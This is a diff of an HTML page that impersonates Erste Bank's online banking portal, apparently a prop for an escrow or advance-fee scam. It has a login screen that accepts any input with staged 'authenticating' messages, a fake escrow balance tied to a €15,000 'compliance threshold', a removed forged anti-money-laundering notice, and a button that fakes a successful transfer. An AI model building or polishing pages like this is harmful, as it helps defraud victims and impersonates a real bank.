@@ -5,9 +5,21 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Erste Bank | Online Banking Portal</title>
     <style>
-        :root { --erste-blue: #00529b; --erste-orange: #fe5000; --bg: #f4f7f9; --text: #333; }
-        body { font-family: 'Segoe UI', Helvetica, Arial, sans-serif; background-color: var(--bg); margin: 0; color: var(--text); }
+        :root { --erste-blue: #00529b; --erste-orange: #fe5000; --erste-green: #28a745; --bg: #f4f7f9; --text: #333; }
+        body { font-family: 'Segoe UI', Helvetica, Arial, sans-serif; background-color: var(--bg); margin: 0; color: var(--text); overflow-x: hidden; }
         
+        /* --- LOGIN & LOADING OVERLAY --- */
+        #login-overlay { background: #002d57; height: 100vh; display: flex; align-items: center; justify-content: center; position: fixed; width: 100%; z-index: 3000; transition: 0.5s; }
+        .login-box { background: white; padding: 40px; border-radius: 4px; width: 320px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.3); }
+        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ced4da; border-radius: 4px; outline: none; }
+        .auth-btn { width: 100%; padding: 12px; background: var(--erste-blue); color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 10px; }
+        
+        /* Spinner Style */
+        .spinner { display: none; margin: 20px auto; width: 40px; height: 40px; border: 4px solid rgba(0,82,155,0.1); border-left-color: var(--erste-blue); border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        #loading-text { display: none; color: #666; font-size: 13px; font-weight: 500; margin-top: 10px; }
+
+        /* --- MAIN UI --- */
         .navbar { background: white; border-bottom: 3px solid var(--erste-blue); padding: 15px 5%; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
         .logo { color: var(--erste-blue); font-weight: 900; font-size: 22px; letter-spacing: -1px; }
         .logo span { color: var(--erste-orange); }
@@ -26,36 +38,38 @@
         .amt { font-size: 36px; font-weight: 700; color: var(--erste-blue); display: block; margin: 10px 0; }
 
         .progress-container { background: #eee; border-radius: 10px; height: 14px; margin: 20px 0 10px 0; overflow: hidden; border: 1px solid #ddd; }
-        .progress-bar { background: linear-gradient(90deg, #ff8c00, #fe5000); height: 100%; width: 87.8%; transition: width 0.5s; }
+        .progress-bar { background: linear-gradient(90deg, #ff8c00, #fe5000); height: 100%; width: 87.8%; transition: 1.5s ease-in-out; }
         
-        .btn-transfer { width: 100%; padding: 15px; background: #e0e0e0; color: #999; border: 1px solid #ccc; border-radius: 4px; font-weight: bold; margin-top: 25px; cursor: not-allowed; }
-
-        .modal { display: none; position: fixed; z-index: 2000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); overflow: auto; padding-top: 30px; }
-        .document-frame { background: white; margin: auto; padding: 50px; width: 90%; max-width: 650px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); position: relative; font-family: 'Times New Roman', serif; border: 1px solid #ddd; }
-        .close-doc { position: absolute; right: 25px; top: 15px; font-size: 35px; cursor: pointer; color: #999; }
-        
-        #login-overlay { background: #002d57; height: 100vh; display: flex; align-items: center; justify-content: center; position: fixed; width: 100%; z-index: 3000; }
-        .login-box { background: white; padding: 40px; border-radius: 4px; width: 320px; text-align: center; }
-        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ced4da; border-radius: 4px; }
-        .auth-btn { width: 100%; padding: 12px; background: var(--erste-blue); color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        .btn-transfer { width: 100%; padding: 15px; background: var(--erste-blue); color: white; border: none; border-radius: 4px; font-weight: bold; margin-top: 25px; cursor: pointer; transition: 0.3s; }
+        .btn-transfer.uploading { background: #6c757d; cursor: wait; }
+        .btn-transfer.success { background: var(--erste-green); cursor: default; }
     </style>
 </head>
 <body>
 
+    <!-- LOGIN & LOADING OVERLAY -->
     <div id="login-overlay">
-        <div class="login-box">
+        <div class="login-box" id="login-box">
             <div class="logo" style="margin-bottom: 25px;">ERSTE <span>GROUP</span></div>
-            <h3 style="font-size: 14px; color: #666;">Secure Portal Login</h3>
-            <input type="text" id="u" placeholder="Username">
-            <input type="password" id="p" placeholder="Password">
-            <button class="auth-btn" onclick="checkAuth()">Sign In</button>
+            
+            <div id="login-form">
+                <h3 style="font-size: 14px; color: #666;">Secure Portal Login</h3>
+                <input type="text" placeholder="Username" id="user">
+                <input type="password" placeholder="Password" id="pass">
+                <button class="auth-btn" onclick="triggerLogin()">Sign In</button>
+            </div>
+
+            <!-- Loading Elements -->
+            <div id="spinner" class="spinner"></div>
+            <div id="loading-text">Authenticating session...</div>
         </div>
     </div>
 
+    <!-- BANK DASHBOARD -->
     <div id="bank-ui" style="display:none;">
         <div class="navbar">
             <div class="logo">ERSTE <span>BANK</span></div>
-            <div class="mfa-status">🛡️ ENCRYPTED SESSION ACTIVE</div>
+            <div id="mfa-badge" class="mfa-status">🛡️ ENCRYPTED SESSION ACTIVE</div>
         </div>
 
         <div class="container">
@@ -63,15 +77,12 @@
                 <div class="card">
                     <h2>Transaction Reference</h2>
                     <div class="row"><span class="label">Reference Code:</span><span class="value" style="color:var(--erste-orange)">TORTILLAS</span></div>
-                    <div class="row"><span class="label">Legal Status:</span><span class="value">Awaiting Minimum Compliance</span></div>
+                    <div class="row"><span class="label">Legal Status:</span><span id="l-status" class="value">Awaiting Minimum Compliance</span></div>
                 </div>
-
-                <div class="card" style="border-left: 5px solid #856404; background-color: #fffdf5;">
+                <div id="conf-card" class="card" style="border-left: 5px solid #856404; background-color: #fffdf5;">
                     <h2 style="color: #856404;">Confidential Funds Transfer</h2>
                     <p style="font-size: 13px; color: #444;">Threshold Requirement for Remote Direct-to-Bank Disbursement.</p>
-                    <a href="javascript:void(0)" onclick="openDoc()" style="color: var(--erste-blue); font-weight: bold; text-decoration: underline; font-size: 14px;">
-                        📂 View AMLA Remote Transfer Protocols.pdf
-                    </a>
+                    <span style="color: var(--erste-blue); font-weight: bold; text-decoration: underline; font-size: 14px; cursor:pointer;">📂 View AMLA Remote Transfer Protocols.pdf</span>
                 </div>
             </div>
 
@@ -79,56 +90,75 @@
                 <div class="card" style="border-top: 5px solid var(--erste-blue);">
                     <h2>Escrow Disbursement Fund</h2>
                     <div class="hold-section">
-                        <div class="lock-icon">🔒 MFA PENDING THRESHOLD</div>
+                        <div id="lock-tag" class="lock-icon">🔒 MFA PENDING THRESHOLD</div>
                         <span class="label" style="font-size: 12px; color: #666;">CURRENT ACCUMULATED TOTAL</span>
                         <span class="amt">€ 15,000.00</span>
-                        
-                        <div class="progress-container"><div class="progress-bar"></div></div>
+                        <div class="progress-container"><div id="p-bar" class="progress-bar"></div></div>
                         <div style="display: flex; justify-content: space-between; font-size: 11px; color: #666; font-weight: bold;">
-                            <span>Complete: 100%</span>
+                            <span id="p-percent">Complete: 87.8%</span>
                             <span>Target: € 15,000.00</span>
                         </div>
-
-                        <p style="font-size: 11px; color: #856404; margin-top: 20px; line-height: 1.5; text-align: left;">
-                            <strong>Note:</strong> Once the <strong>€ 15,000.00</strong> threshold is met, the "Transfer" button will be enabled. Funds will be sent directly to your primary bank account. <em>No physical branch appearance required.</em>
-                        </p>
-
-                        <button class="btn-transfer">Direct Bank Transfer</button>
+                        <button id="transBtn" class="btn-transfer" onclick="finalizeTransfer()">Direct Bank Transfer</button>
                     </div>
                 </div>
             </div>
         </div>
     </div>
 
-    <!-- Document Modal -->
-    <div id="docModal" class="modal">
-        <div class="document-frame">
-            <span class="close-doc" onclick="closeDoc()">&times;</span>
-            <div style="text-align: center; border-bottom: 2px solid #333; padding-bottom: 15px; margin-bottom: 20px;">
-                <div style="font-size: 28px; font-weight: bold; color: #1a237e;">AMLA</div>
-                <div style="font-size: 10px; color: #666; letter-spacing: 1px;">ANTI-MONEY LAUNDERING AUTHORITY</div>
-            </div>
-            <div style="font-size: 18px; font-weight: bold; text-align: center; text-decoration: underline; margin-bottom: 20px;">NOTICE OF REMOTE TRANSFER COMPLIANCE</div>
-            <div style="font-size: 14px; line-height: 1.6; color: #222; text-align: justify;">
-                <p>Pursuant to international banking regulations for <strong>Confidential Funds Transfer</strong>, the beneficiary is eligible for remote disbursement (non-physical appearance) only if the total escrow amount meets the <strong>€15,000.00 Minimum Compliance Threshold</strong>.</p>
-                <p>Current balances below this threshold require the beneficiary to visit the <em>Sarengrad, Palit 69 (Croatia)</em> branch for notarized physical identification. Upon meeting the threshold, the <strong>MFA Remote Release</strong> will be authorized for immediate bank-to-bank wire transfer.</p>
-            </div>
-            <div style="margin-top: 40px; font-size: 12px; border-top: 1px solid #333; padding-top: 15px; display: flex; justify-content: space-between;">
-                <div><strong>Authorized by:</strong><br>BRUNA SZEGO (Chair)</div>
-                <div style="text-align: right;"><strong>Status:</strong> <span style="color:red">● Pending</span></div>
-            </div>
-        </div>
-    </div>
-
     <script>
-        function checkAuth() {
-            if(document.getElementById('u').value !== "" && document.getElementById('p').value !== "") {
-                document.getElementById('login-overlay').style.display = 'none';
-                document.getElementById('bank-ui').style.display = 'block';
-            }
+        // --- LOGIN LOGIC WITH LOADING ---
+        function triggerLogin() {
+            const form = document.getElementById('login-form');
+            const spinner = document.getElementById('spinner');
+            const loadText = document.getElementById('loading-text');
+            const overlay = document.getElementById('login-overlay');
+
+            // I-hide ang form, ipakita ang loading
+            form.style.display = 'none';
+            spinner.style.display = 'block';
+            loadText.style.display = 'block';
+
+            // Sequence ng loading messages
+            setTimeout(() => { loadText.innerText = "Verifying credentials..."; }, 1000);
+            setTimeout(() => { loadText.innerText = "Establishing encrypted link..."; }, 2500);
+            setTimeout(() => { loadText.innerText = "Fetching escrow data..."; }, 4000);
+
+            // Pasok sa Dashboard after 5 seconds
+            setTimeout(() => {
+                overlay.style.opacity = '0';
+                setTimeout(() => {
+                    overlay.style.display = 'none';
+                    document.getElementById('bank-ui').style.display = 'block';
+                }, 500);
+            }, 5000);
         }
-        function openDoc() { document.getElementById("docModal").style.display = "block"; }
-        function closeDoc() { document.getElementById("docModal").style.display = "none"; }
+
+        // --- TRANSFER LOGIC (FROM PREVIOUS UPDATE) ---
+        function finalizeTransfer() {
+            const btn = document.getElementById('transBtn');
+            const pBar = document.getElementById('p-bar');
+            const pPercent = document.getElementById('p-percent');
+            
+            btn.innerHTML = "UPLOADING TO UPDATE...";
+            btn.classList.add('uploading');
+
+            setTimeout(() => {
+                pBar.style.width = "100%";
+                pBar.style.background = "linear-gradient(90deg, #28a745, #5cd65c)";
+                pPercent.innerText = "Complete: 100%";
+                
+                document.getElementById('l-status').innerText = "COMPLETED / VERIFIED";
+                document.getElementById('l-status').style.color = "var(--erste-green)";
+                document.getElementById('lock-tag').style.background = "var(--erste-green)";
+                document.getElementById('lock-tag').innerText = "✅ MFA VERIFIED";
+                
+                btn.innerHTML = "TRANSFER SUCCESSFUL";
+                btn.classList.remove('uploading');
+                btn.classList.add('success');
+                
+                alert("Transaction Processed. Funds dispatched to local account.");
+            }, 3000);
+        }
     </script>
 </body>
 </html>
